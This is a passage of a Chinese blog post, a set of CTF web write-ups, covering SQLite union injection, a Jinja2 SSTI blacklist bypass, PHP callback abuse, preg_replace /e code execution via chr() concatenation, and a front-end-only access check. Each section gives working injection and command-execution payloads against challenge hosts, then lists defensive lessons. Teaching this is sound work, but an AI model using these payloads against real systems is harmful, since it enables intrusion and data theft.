+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 4 -- </span></span><br></pre></td></tr></table></figure>
+
+<p>报错，说明字段数不是 <code>4</code>，于是继续确认字段数为 <code>3</code>。然后试联合查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --</span></span><br></pre></td></tr></table></figure>
+
+<p>页面能正常回显，说明：</p>
+<ul>
+<li><code>union select</code> 能用</li>
+<li>第二列大概率是可见位</li>
+</ul>
+<p>为什么怀疑是 SQLite，如果一开始如果按 <code>MySQL</code> 的习惯去爆：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --</span></span><br></pre></td></tr></table></figure>
+
+<p>没有结果，这时候就不该继续死磕 <code>information_schema</code> 了，而是应该怀疑数据库类型。</p>
+<p>SQLite 的元数据通常在：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite_master</span><br></pre></td></tr></table></figure>
+
+<p>于是改成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(name),3 from sqlite_master where type=&#x27;</span><span class="keyword">table</span><span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到表名后，再读建表语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,sql,3 from sqlite_master where type=&#x27;</span><span class="keyword">table</span><span class="string">&#x27; and name=&#x27;</span>flags<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
+
+<p>最后直接取值：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,value,3 from flags --</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>information_schema</code> 查不出来，不代表没洞，也可能只是数据库不是 <code>MySQL</code></li>
+<li>看到 <code>sqlite_master</code> 要立刻想到 <code>SQLite</code></li>
+<li>注入题最怕的不是不会 payload，而是顺序乱了之后把自己带偏</li>
+</ul>
+<h2 id="答案之书"><a href="#答案之书" class="headerlink" title="答案之书"></a>答案之书</h2><p><code>Flask / Jinja2 SSTI</code></p>
+<p>页面本身很花，但测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49</span><br></pre></td></tr></table></figure>
+
+<p>这基本就能认出是模板注入了，而且是 <code>Jinja2</code> 风格。</p>
+<p>题目过滤了这些关键字：</p>
+<ul>
+<li><code>__class__</code></li>
+<li><code>__globals__</code></li>
+<li><code>os</code></li>
+<li><code>popen</code></li>
+</ul>
+<p>普通的 <code>Jinja2 SSTI</code> 路线通常是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象 -&gt; 类 -&gt; 基类 -&gt; 子类列表 -&gt; 特定类 -&gt; __globals__ -&gt; os -&gt; popen</span><br></pre></td></tr></table></figure>
+
+<p>但这题把其中几个最经典的关键字 ban 掉了，照抄常规 payload 很容易直接被拦。</p>
+<p>好在模板环境里有一个现成对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会返回：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这就说明 <code>cycler</code> 可用。再往后用 <code>cycler.next</code>，可以少走很多“对象找类”的步骤，直接接近可利用的全局空间。</p>
+<p>这题的绕过关键在于，黑名单通常按“连续字符串”匹配，而 Python 字符串支持天然拼接。</p>
+<p>例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span><span class="string">&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>会被解释成：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;ab&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>于是像 <code>__globals__</code> 这种敏感词，就可以拆开写成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;_&#x27;+&#x27;_&#x27;+&#x27;g&#x27;&#x27;lobals&#x27;+&#x27;_&#x27;+&#x27;_&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>同理，<code>os</code> 和 <code>popen</code> 也可以拆。</p>
+<p>先列根目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(cycler.next[&#x27;_&#x27;+&#x27;_&#x27;+&#x27;g&#x27;&#x27;lobals&#x27;+&#x27;_&#x27;+&#x27;_&#x27;][&#x27;o&#x27;&#x27;s&#x27;][&#x27;p&#x27;&#x27;open&#x27;](&#x27;ls /&#x27;)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>确定根目录存在 <code>flag</code> 后，再直接读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(cycler.next[&#x27;_&#x27;+&#x27;_&#x27;+&#x27;g&#x27;&#x27;lobals&#x27;+&#x27;_&#x27;+&#x27;_&#x27;][&#x27;o&#x27;&#x27;s&#x27;][&#x27;p&#x27;&#x27;open&#x27;](&#x27;cat /flag&#x27;)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qsnctf&#123;f408850793cd492e864a9e19fc73861c&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&#123;&#123;7*7&#125;&#125; -&gt; 49</code> 是经典的 <code>SSTI</code> 探针</li>
+<li>黑名单题不要只想某条固定链子，要先看模板里有哪些现成对象可借</li>
+<li>拼接、拆分、编码，本质上都是在和“字符串匹配型 WAF”打时间差</li>
+</ul>
+<h2 id="CallBack"><a href="#CallBack" class="headerlink" title="CallBack"></a>CallBack</h2><p><code>PHP 危险回调</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">executeCallback</span>(<span class="params"><span class="variable">$callback</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$someArray</span> = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_map</span>(<span class="variable">$callback</span>, <span class="variable">$someArray</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$evilCallback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">    <span class="variable">$newArray</span> = <span class="title function_ invoke__">executeCallback</span>(<span class="variable">$evilCallback</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>题目危险点非常明显：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$callback</span>, <span class="variable">$someArray</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>array_map()</code> 的第一个参数是回调函数名，而这个值又完全来自用户输入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$evilCallback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>于是就变成了一个“任意单参数函数调用”的问题。</p>
+<p>如果传：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?callback=phpinfo</span><br></pre></td></tr></table></figure>
+
+<p>那么实际执行效果大致相当于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>(<span class="number">2</span>);</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+
+<p>虽然会调用多次，但 <code>phpinfo()</code> 可以正常接收参数，而且会把大量环境信息打出来。这题的 flag 就藏在页面输出里，搜索 <code>flag</code> 就能找到。</p>
+<p>直接访问：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:55847/?callback=phpinfo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qsnctf&#123;c0f303a17a1749e1aa2ec35a5b7a4943&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>array_map</code>、<code>call_user_func</code>、<code>usort</code> 这类“可控回调”函数都很值得警惕</li>
+<li>回调可控不一定直接是 RCE，但通常至少能做到“任意函数调用”</li>
+<li><code>phpinfo()</code> 在 CTF 里既可能是信息泄露点，也可能直接藏结果</li>
+</ul>
+<h2 id="preg-replac"><a href="#preg-replac" class="headerlink" title="preg_replac"></a>preg_replac</h2><p><code>preg_replace /e</code> 远程代码执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/(.*)/e&quot;</span>, <span class="string">&quot;\\1&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到这句就该立刻警觉：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/(.*)/e&quot;</span>, <span class="string">&quot;\\1&quot;</span>, <span class="variable">$input</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在旧版 <code>PHP</code> 里，<code>preg_replace()</code> 的 <code>/e</code> 修饰符会让替换结果再被当成 PHP 代码执行一次。所以这里的核心风险不是正则，而是“你的输入最终会被执行”。</p>
+<p>而正则：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(.*)/</span><br></pre></td></tr></table></figure>
+
+<p>几乎就是在匹配整段输入，因此只要黑名单能绕过去，这题就是典型代码执行。</p>
+<p>WAF 绕过:</p>
+<ul>
+<li>花括号不行</li>
+<li>引号不行</li>
+<li><code>base64</code> 不行</li>
+<li><code>hex</code> 不行</li>
+</ul>
+<p>最后可行的是 <code>chr()</code> 拼接。先测试列目录：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">chr</span>(<span class="number">108</span>).<span class="title function_ invoke__">chr</span>(<span class="number">115</span>).<span class="title function_ invoke__">chr</span>(<span class="number">32</span>).<span class="title function_ invoke__">chr</span>(<span class="number">47</span>))</span><br></pre></td></tr></table></figure>
+
+<p>也就是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /</span><br></pre></td></tr></table></figure>
+
+<p>确认命令执行成功后，再读 flag：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">chr</span>(<span class="number">99</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>).<span class="title function_ invoke__">chr</span>(<span class="number">32</span>).<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">108</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>))</span><br></pre></td></tr></table></figure>
+
+<p>也就是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>
+
+<p>Payload:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:55871/?data=system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qsnctf&#123;2a3873d2c6c14650812e2b674c0f8c18&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>看见 <code>preg_replace(.../e...)</code>，优先想到老版本 <code>PHP</code> 下的代码执行</li>
+<li>黑名单拦字符串时，<code>chr()</code> 拼接是一种很常见也很稳定的绕过方式</li>
+<li>老洞之所以常考，不是因为 payload 难，而是因为第一眼要认出来</li>
+</ul>
+<h2 id="时间胶囊留言板"><a href="#时间胶囊留言板" class="headerlink" title="时间胶囊留言板"></a>时间胶囊留言板</h2><p><code>前端鉴权缺陷</code> + <code>越权读取</code></p>
+<p>前端的核心逻辑是：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (now &gt;= unlockDateObj) &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;get_content.php?id=&#x27;</span> + messageId)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，留言是否“解封”，主要是浏览器自己决定的。</p>
+<p>题目表面上是在做时间锁，但真正的问题是：</p>
+<ul>
+<li>前端负责判断是否可见</li>
+<li>后端接口似乎只根据 <code>id</code> 返回内容</li>
+</ul>
+<p>一旦访问控制发生在前端，第一反应就应该是：</p>
+<p><code>那我能不能直接请求真实接口？</code></p>
+<p>页面中 <code>id=2</code> 的内容被星号遮住，而且长度也很可疑，很像系统预置的 flag。既然前端最终也是：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;get_content.php?id=&#x27;</span> + messageId)</span><br></pre></td></tr></table></figure>
+
+<p>那直接手工访问就行。</p>
+<p>直接访问:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:55969/get_content.php?id=2</span><br></pre></td></tr></table></figure>
+
+<p>也可以在浏览器控制台里执行：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;get_content.php?id=2&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ID 2 的真实内容是: &quot;</span> + data));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qsnctf&#123;f383e5ae50ad4c6fb4f93ebcc2d79d0c&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题其实还有一个比较朴素的思路，就是直接把自己电脑时间往后调。但从安全角度看，真正的问题仍然是服务端没有做校验，因为只改本地时间本质上还是在欺骗前端逻辑。</p>
+<ul>
+<li>前端隐藏、倒计时、灰掉按钮，都不等于真正的权限控制</li>
+<li>真正的访问控制必须由服务端决定</li>
+<li>遇到“只有时间到了才显示”“只有管理员点击才展示”这类描述时，先找真实接口</li>
+</ul>
+<h2 id="S1-签到"><a href="#S1-签到" class="headerlink" title="S1 签到"></a>S1 签到</h2><p><code>签到题</code></p>
+<p>页面直接给了提示：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不知道 KEY？加群 1070358302 查看群公告内容</span><br></pre></td></tr></table></figure>
+
+<p>最后拿到的 key 是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q5NC7F-51</span><br></pre></td></tr></table></figure>
+
+<p>提交后得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qsnctf&#123;626bfab435d84a3997f4c2acb1fb18d6&#125;</span><br></pre></td></tr></table></figure>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/CTF/">CTF</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PHP/">PHP</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Writeup/">Writeup</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/SSTI/">SSTI</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/04/01/jnu-web-security-challenge-writeup/"
+                                   title="暨南 Web 安全挑战赛"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">暨南 Web 安全挑战赛</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">hsjcha</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
